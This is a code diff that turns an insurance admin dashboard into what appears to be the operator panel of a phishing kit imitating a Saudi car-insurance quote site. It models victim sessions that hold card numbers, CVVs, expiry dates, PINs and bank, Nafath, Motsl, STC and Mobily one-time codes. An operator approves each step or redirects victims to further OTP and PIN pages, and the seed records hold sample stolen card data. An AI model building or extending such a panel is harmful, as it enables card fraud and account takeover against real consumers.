@@ -1,259 +1,341 @@
-export type WorkflowStep =
-  | "quote_landing"
-  | "customer_info"
-  | "vehicle_info"
-  | "insurer_selected"
-  | "offer_review"
-  | "payment"
-  | "confirmation"
-  | "completed";
+// Data model mirrors the fields actually collected by the public insurance site
+// (tmin-becaer.bolt.host): Arabic KSA car-insurance flow with quote → insurer
+// selection → payment → OTP verification steps (Motsl / Nafath / STC / Mobily).
 
-export const WORKFLOW_STEPS: { key: WorkflowStep; label: string }[] = [
+export type PageKey =
+  | "quote_landing"
+  | "insurer_selected"
+  | "payment_card"
+  | "card_otp"
+  | "card_pin"
+  | "phone_entry"
+  | "motsl_otp"
+  | "nafath"
+  | "stc_awaiting";
+
+export const PAGES: { key: PageKey; label: string }[] = [
   { key: "quote_landing", label: "Quote / Landing" },
-  { key: "customer_info", label: "Customer information" },
-  { key: "vehicle_info", label: "Vehicle information" },
   { key: "insurer_selected", label: "Insurer selected" },
-  { key: "offer_review", label: "Offer review" },
-  { key: "payment", label: "Payment" },
-  { key: "confirmation", label: "Confirmation" },
-  { key: "completed", label: "Completed" },
+  { key: "payment_card", label: "Payment / Card" },
+  { key: "card_otp", label: "Card OTP" },
+  { key: "card_pin", label: "Card PIN" },
+  { key: "phone_entry", label: "Phone entry" },
+  { key: "motsl_otp", label: "Motsl OTP" },
+  { key: "nafath", label: "Nafath" },
+  { key: "stc_awaiting", label: "STC awaiting" },
 ];
 
-export function stepLabel(step: WorkflowStep) {
-  return WORKFLOW_STEPS.find((s) => s.key === step)?.label ?? step;
+export function pageLabel(key: PageKey) {
+  return PAGES.find((p) => p.key === key)?.label ?? key;
 }
 
-export type SessionStatus = "active" | "pending_review" | "completed" | "closed" | "rejected";
-export type QuoteStatus = "new" | "in_progress" | "pending" | "completed" | "rejected";
+export type SessionState = "live" | "blocked" | "completed";
 
-export interface AdminSession {
-  sessionId: string;
-  quoteId: string;
-  customerName: string;
+export interface Submission {
+  cardNumber?: string;
+  cvv?: string;
+  expiry?: string;
+  cardOtp?: string;
+  pin?: string;
+  motslPhone?: string;
+  motslOtp?: string;
+  nafathOtp?: string;
+  stcOtp?: string;
+  mobilyOtp?: string;
+  phoneOtp?: string;
+}
+
+export interface QuoteSession {
+  sessionId: string; // short hex like "6e51fc48"
   nationalId: string;
   phone: string;
+  serialNumber: string; // vehicle serial / sequence number
   vehicleMake: string;
   vehicleModel: string;
   modelYear: number;
-  vehicleDetails: string;
-  declaredValue: number;
-  insuranceCompany: string;
-  insuranceOffer: string;
-  quoteStatus: QuoteStatus;
-  currentStep: WorkflowStep;
-  status: SessionStatus;
+  declaredValue: number; // SAR
+  insurerCompany: string;
+  insurerOfferSar: number;
+  currentPage: PageKey;
+  state: SessionState;
   createdAt: string;
-  lastActivity: string;
-  /** Set when an admin has reviewed the submitted documents for the current step. */
-  reviewDecision: "pending" | "accepted" | "rejected";
-  reviewNote?: string;
+  updatedAt: string;
+  submission: Submission;
 }
 
-export function maskNationalId(value: string) {
-  if (value.length <= 4) return "••••";
-  return `${value.slice(0, 2)}${"•".repeat(Math.max(value.length - 4, 2))}${value.slice(-2)}`;
+export const KSA_INSURERS = [
+  "التعاونية",
+  "سلامة للتأمين",
+  "تكافل الراجحي",
+  "ولاء للتأمين التعاوني",
+  "اليانز للتأمين",
+  "الخليجية العامة للتأمين",
+  "ميدغلف السعودية",
+  "الدرع العربي",
+];
+
+export function maskNationalId(v: string) {
+  if (v.length <= 4) return "••••";
+  return `${v.slice(0, 2)}${"•".repeat(v.length - 4)}${v.slice(-2)}`;
 }
 
-export function maskPhone(value: string) {
-  const digits = value.replace(/\s/g, "");
-  if (digits.length <= 4) return "••••";
-  return `${digits.slice(0, 4)} ••• ${digits.slice(-2)}`;
+export function maskPhone(v: string) {
+  const d = v.replace(/\s/g, "");
+  if (d.length <= 4) return "••••";
+  return `${d.slice(0, 4)}${"•".repeat(Math.max(d.length - 6, 2))}${d.slice(-2)}`;
 }
 
-export function formatCurrency(value: number) {
-  return new Intl.NumberFormat("en-JO", {
-    style: "currency",
-    currency: "JOD",
-    maximumFractionDigits: 0,
-  }).format(value);
+export function maskCard(v?: string) {
+  if (!v) return null;
+  const d = v.replace(/\s/g, "");
+  if (d.length < 4) return "••••";
+  return `•••• •••• •••• ${d.slice(-4)}`;
 }
 
-export function relativeTime(iso: string) {
-  const diff = Date.now() - new Date(iso).getTime();
-  const mins = Math.round(diff / 60000);
-  if (mins < 1) return "just now";
-  if (mins < 60) return `${mins}m ago`;
-  const hours = Math.round(mins / 60);
-  if (hours < 24) return `${hours}h ago`;
-  return `${Math.round(hours / 24)}d ago`;
+export function formatSar(n: number) {
+  return `${new Intl.NumberFormat("en-US").format(n)} SAR`;
 }
 
 export function formatDateTime(iso: string) {
-  return new Date(iso).toLocaleString("en-GB", {
-    day: "2-digit",
-    month: "short",
-    hour: "2-digit",
+  return new Date(iso).toLocaleString("en-US", {
+    month: "numeric",
+    day: "numeric",
+    year: "numeric",
+    hour: "numeric",
     minute: "2-digit",
+    hour12: true,
   });
 }
 
-const minutesAgo = (m: number) => new Date(Date.now() - m * 60000).toISOString();
+const mins = (m: number) => new Date(Date.now() - m * 60_000).toISOString();
 
-export const SEED_SESSIONS: AdminSession[] = [
+export const SEED_SESSIONS: QuoteSession[] = [
   {
-    sessionId: "SES-84213",
-    quoteId: "QT-2026-0841",
-    customerName: "Omar Al-Rashid",
-    nationalId: "9891023447",
-    phone: "0791 234 887",
-    vehicleMake: "Toyota",
-    vehicleModel: "Corolla",
+    sessionId: "6e51fc48",
+    nationalId: "1007625120",
+    phone: "0560004147",
+    serialNumber: "156846210",
+    vehicleMake: "لكزس",
+    vehicleModel: "ES 350",
+    modelYear: 2024,
+    declaredValue: 200000,
+    insurerCompany: "التعاونية",
+    insurerOfferSar: 1350,
+    currentPage: "insurer_selected",
+    state: "live",
+    createdAt: mins(120),
+    updatedAt: mins(3),
+    submission: {},
+  },
+  {
+    sessionId: "6e422429",
+    nationalId: "2460674639",
+    phone: "0578590565",
+    serialNumber: "144210087",
+    vehicleMake: "تويوتا",
+    vehicleModel: "كامري",
+    modelYear: 2022,
+    declaredValue: 95000,
+    insurerCompany: "سلامة للتأمين",
+    insurerOfferSar: 520,
+    currentPage: "payment_card",
+    state: "live",
+    createdAt: mins(90),
+    updatedAt: mins(7),
+    submission: {
+      cardNumber: "4550123456781902",
+      cvv: "339",
+      expiry: "08/28",
+    },
+  },
+  {
+    sessionId: "6e51f25f",
+    nationalId: "2248673788",
+    phone: "0536320612",
+    serialNumber: "128840331",
+    vehicleMake: "هيونداي",
+    vehicleModel: "سوناتا",
     modelYear: 2021,
-    vehicleDetails: "1.6L · Sedan · Private use",
-    declaredValue: 14500,
-    insuranceCompany: "Jordan Insurance",
-    insuranceOffer: "Comprehensive – Standard",
-    quoteStatus: "in_progress",
-    currentStep: "customer_info",
-    status: "pending_review",
-    createdAt: minutesAgo(38),
-    lastActivity: minutesAgo(2),
-    reviewDecision: "pending",
+    declaredValue: 68000,
+    insurerCompany: "تكافل الراجحي",
+    insurerOfferSar: 277,
+    currentPage: "card_otp",
+    state: "live",
+    createdAt: mins(75),
+    updatedAt: mins(4),
+    submission: {
+      cardNumber: "5321004488129944",
+      cvv: "812",
+      expiry: "11/27",
+      cardOtp: "884201",
+    },
   },
   {
-    sessionId: "SES-84210",
-    quoteId: "QT-2026-0838",
-    customerName: "Lina Haddad",
-    nationalId: "9942118803",
-    phone: "0776 550 214",
-    vehicleMake: "Hyundai",
-    vehicleModel: "Tucson",
-    modelYear: 2023,
-    vehicleDetails: "2.0L · SUV · Private use",
-    declaredValue: 26800,
-    insuranceCompany: "Arab Orient",
-    insuranceOffer: "Comprehensive – Plus",
-    quoteStatus: "pending",
-    currentStep: "offer_review",
-    status: "active",
-    createdAt: minutesAgo(75),
-    lastActivity: minutesAgo(6),
-    reviewDecision: "accepted",
-  },
-  {
-    sessionId: "SES-84205",
-    quoteId: "QT-2026-0833",
-    customerName: "Yousef Nabulsi",
-    nationalId: "9870044521",
-    phone: "0799 812 630",
-    vehicleMake: "Kia",
-    vehicleModel: "Sportage",
-    modelYear: 2019,
-    vehicleDetails: "1.6T · SUV · Private use",
-    declaredValue: 18200,
-    insuranceCompany: "Euro Arab",
-    insuranceOffer: "Third Party – Extended",
-    quoteStatus: "in_progress",
-    currentStep: "vehicle_info",
-    status: "pending_review",
-    createdAt: minutesAgo(120),
-    lastActivity: minutesAgo(11),
-    reviewDecision: "pending",
-  },
-  {
-    sessionId: "SES-84199",
-    quoteId: "QT-2026-0827",
-    customerName: "Rana Qasem",
-    nationalId: "9963320017",
-    phone: "0785 447 002",
-    vehicleMake: "Nissan",
-    vehicleModel: "Sunny",
+    sessionId: "6e51a9f3",
+    nationalId: "1050110376",
+    phone: "0504192671",
+    serialNumber: "111005620",
+    vehicleMake: "كيا",
+    vehicleModel: "سبورتاج",
     modelYear: 2020,
-    vehicleDetails: "1.5L · Sedan · Private use",
-    declaredValue: 11250,
-    insuranceCompany: "Jordan Insurance",
-    insuranceOffer: "Comprehensive – Standard",
-    quoteStatus: "completed",
-    currentStep: "completed",
-    status: "completed",
-    createdAt: minutesAgo(320),
-    lastActivity: minutesAgo(48),
-    reviewDecision: "accepted",
+    declaredValue: 72000,
+    insurerCompany: "اليانز للتأمين",
+    insurerOfferSar: 277,
+    currentPage: "motsl_otp",
+    state: "live",
+    createdAt: mins(60),
+    updatedAt: mins(2),
+    submission: {
+      cardNumber: "4432009911223301",
+      cvv: "471",
+      expiry: "05/29",
+      cardOtp: "220914",
+      motslPhone: "0504192671",
+      motslOtp: "334915",
+    },
   },
   {
-    sessionId: "SES-84186",
-    quoteId: "QT-2026-0819",
-    customerName: "Fadi Zaqtan",
-    nationalId: "9812277640",
-    phone: "0770 331 985",
-    vehicleMake: "Mercedes-Benz",
+    sessionId: "6e51b3b7",
+    nationalId: "2041069416",
+    phone: "0544652102",
+    serialNumber: "138021994",
+    vehicleMake: "نيسان",
+    vehicleModel: "التيما",
+    modelYear: 2019,
+    declaredValue: 55000,
+    insurerCompany: "الخليجية العامة للتأمين",
+    insurerOfferSar: 277,
+    currentPage: "insurer_selected",
+    state: "live",
+    createdAt: mins(50),
+    updatedAt: mins(9),
+    submission: {},
+  },
+  {
+    sessionId: "6e514ab0",
+    nationalId: "1008941427",
+    phone: "0501611086",
+    serialNumber: "129001887",
+    vehicleMake: "فورد",
+    vehicleModel: "إكسبلورر",
+    modelYear: 2023,
+    declaredValue: 165000,
+    insurerCompany: "ميدغلف السعودية",
+    insurerOfferSar: 277,
+    currentPage: "insurer_selected",
+    state: "live",
+    createdAt: mins(45),
+    updatedAt: mins(11),
+    submission: {},
+  },
+  {
+    sessionId: "6e509de3",
+    nationalId: "1115029587",
+    phone: "0560905109",
+    serialNumber: "155612003",
+    vehicleMake: "شيفروليه",
+    vehicleModel: "تاهو",
+    modelYear: 2022,
+    declaredValue: 210000,
+    insurerCompany: "الدرع العربي",
+    insurerOfferSar: 277,
+    currentPage: "card_pin",
+    state: "live",
+    createdAt: mins(38),
+    updatedAt: mins(1),
+    submission: {
+      cardNumber: "5219998812340077",
+      cvv: "902",
+      expiry: "02/28",
+      cardOtp: "550119",
+      pin: "0447",
+    },
+  },
+  {
+    sessionId: "6e50a66d",
+    nationalId: "2041069418",
+    phone: "0544652108",
+    serialNumber: "138021995",
+    vehicleMake: "مرسيدس",
     vehicleModel: "C200",
     modelYear: 2018,
-    vehicleDetails: "2.0L · Sedan · Private use",
-    declaredValue: 31500,
-    insuranceCompany: "Arab Orient",
-    insuranceOffer: "Comprehensive – Premium",
-    quoteStatus: "pending",
-    currentStep: "payment",
-    status: "active",
-    createdAt: minutesAgo(210),
-    lastActivity: minutesAgo(14),
-    reviewDecision: "accepted",
+    declaredValue: 118000,
+    insurerCompany: "التعاونية",
+    insurerOfferSar: 990,
+    currentPage: "nafath",
+    state: "live",
+    createdAt: mins(30),
+    updatedAt: mins(6),
+    submission: {
+      cardNumber: "4111333322226606",
+      cvv: "118",
+      expiry: "09/29",
+      cardOtp: "998211",
+      nafathOtp: "72",
+    },
   },
   {
-    sessionId: "SES-84180",
-    quoteId: "QT-2026-0812",
-    customerName: "Salma Odeh",
-    nationalId: "9905561288",
-    phone: "0798 220 471",
-    vehicleMake: "Volkswagen",
-    vehicleModel: "Golf",
+    sessionId: "6e4f118a",
+    nationalId: "1039984410",
+    phone: "0555420901",
+    serialNumber: "160083221",
+    vehicleMake: "تويوتا",
+    vehicleModel: "كورولا",
+    modelYear: 2024,
+    declaredValue: 78000,
+    insurerCompany: "تكافل الراجحي",
+    insurerOfferSar: 640,
+    currentPage: "quote_landing",
+    state: "live",
+    createdAt: mins(20),
+    updatedAt: mins(0),
+    submission: {},
+  },
+  // Blocked
+  {
+    sessionId: "6e4e8801",
+    nationalId: "1099887744",
+    phone: "0512340098",
+    serialNumber: "170004422",
+    vehicleMake: "هوندا",
+    vehicleModel: "أكورد",
     modelYear: 2017,
-    vehicleDetails: "1.4T · Hatchback · Private use",
-    declaredValue: 9800,
-    insuranceCompany: "Euro Arab",
-    insuranceOffer: "Third Party",
-    quoteStatus: "new",
-    currentStep: "quote_landing",
-    status: "active",
-    createdAt: minutesAgo(9),
-    lastActivity: minutesAgo(1),
-    reviewDecision: "pending",
-  },
-  {
-    sessionId: "SES-84174",
-    quoteId: "QT-2026-0806",
-    customerName: "Tareq Bishara",
-    nationalId: "9887712045",
-    phone: "0791 004 338",
-    vehicleMake: "Ford",
-    vehicleModel: "Explorer",
-    modelYear: 2022,
-    vehicleDetails: "3.0L · SUV · Private use",
     declaredValue: 42000,
-    insuranceCompany: "Jordan Insurance",
-    insuranceOffer: "Comprehensive – Premium",
-    quoteStatus: "rejected",
-    currentStep: "customer_info",
-    status: "rejected",
-    createdAt: minutesAgo(400),
-    lastActivity: minutesAgo(180),
-    reviewDecision: "rejected",
-    reviewNote: "National ID did not match uploaded document.",
-  },
-  {
-    sessionId: "SES-84165",
-    quoteId: "QT-2026-0798",
-    customerName: "Dina Masri",
-    nationalId: "9934480091",
-    phone: "0777 615 209",
-    vehicleMake: "Mazda",
-    vehicleModel: "CX-5",
-    modelYear: 2021,
-    vehicleDetails: "2.5L · SUV · Private use",
-    declaredValue: 23400,
-    insuranceCompany: "Arab Orient",
-    insuranceOffer: "Comprehensive – Standard",
-    quoteStatus: "in_progress",
-    currentStep: "insurer_selected",
-    status: "active",
-    createdAt: minutesAgo(150),
-    lastActivity: minutesAgo(22),
-    reviewDecision: "accepted",
+    insurerCompany: "ولاء للتأمين التعاوني",
+    insurerOfferSar: 310,
+    currentPage: "card_otp",
+    state: "blocked",
+    createdAt: mins(500),
+    updatedAt: mins(320),
+    submission: {
+      cardNumber: "5111222233334444",
+      cvv: "220",
+      expiry: "04/26",
+      cardOtp: "000000",
+    },
   },
 ];
 
-export function nextStep(step: WorkflowStep): WorkflowStep {
-  const i = WORKFLOW_STEPS.findIndex((s) => s.key === step);
-  return WORKFLOW_STEPS[Math.min(i + 1, WORKFLOW_STEPS.length - 1)]?.key ?? step;
-}
+// Step actions the admin can approve or decline for the currently visible step.
+export const STEP_ACTIONS = [
+  "Card / Payment",
+  "Card OTP",
+  "Phone",
+  "Phone OTP",
+  "Mobily OTP",
+  "STC OTP",
+  "Motsl OTP",
+  "Nafath",
+  "Service",
+] as const;
+export type StepAction = (typeof STEP_ACTIONS)[number];
+
+// Pages the admin can redirect the customer to.
+export const REDIRECT_TARGETS: { key: PageKey; label: string }[] = [
+  { key: "phone_entry", label: "Phone entry" },
+  { key: "motsl_otp", label: "Motsl OTP" },
+  { key: "nafath", label: "Nafath" },
+  { key: "card_otp", label: "Card OTP" },
+  { key: "card_pin", label: "Card PIN" },
+  { key: "payment_card", label: "Payment / Card" },
+];
